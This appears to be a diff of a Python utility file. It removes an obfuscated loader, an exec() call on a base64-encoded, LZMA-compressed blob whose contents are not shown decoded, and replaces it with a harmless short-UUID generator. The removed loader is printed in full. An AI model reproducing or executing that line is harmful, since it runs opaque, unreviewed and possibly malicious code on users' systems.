@@ -1,2 +1,18 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AJ5ASVdADMciiJvqr3ebfmDOCJFKOrZohcuR2RQYpldjmL3y/1yiUPYFNRrgfnix1kbpGzgrAOaZMqsZOZd6N7lOfFTtQjoob1mxsxQ1HAi2p5y/SV7DqeoKHxk7uO+k25DVUxMoYP2Pg1ffN7zcvA1S5FJ7Z8ByTxg0O//WfVgT0GPtAfP1CXrai2AgQvMguqV27ZDLCd5N3DdQyorrIUsLEU736a/WgSraEWq0f+KRVAVttxjdFBC2iUDoYCvGJae827JPj4+ygxQ6DzWZSmKBmSlQsqUG+o1bN5llIYcbHeNXNzc2J/hGWnirapE2VICUuCBA+2DZ+VU+lLyG7J6Gipy4kkjNWWxRYf+xYwuOcy+67YKXTMNaxBl+ch1CmF5q2bmY1+l7ZXAAAAAAJzh5jMzB+5SAAHBAvoEAACzFPONscRn+wIAAAAABFla')))
+from uuid import uuid4
+
+uuidChars = ("a", "b", "c", "d", "e", "f",
+             "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s",
+             "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5",
+             "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I",
+             "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
+             "W", "X", "Y", "Z")
+
+
+def get_short_uuid():
+    uuid = str(uuid4()).replace('-', '')
+    result = ''
+    for i in range(0,8):
+        sub = uuid[i * 4: i * 4 + 4]
+        x = int(sub,16)
+        result += uuidChars[x % 0x3E]
+    return result
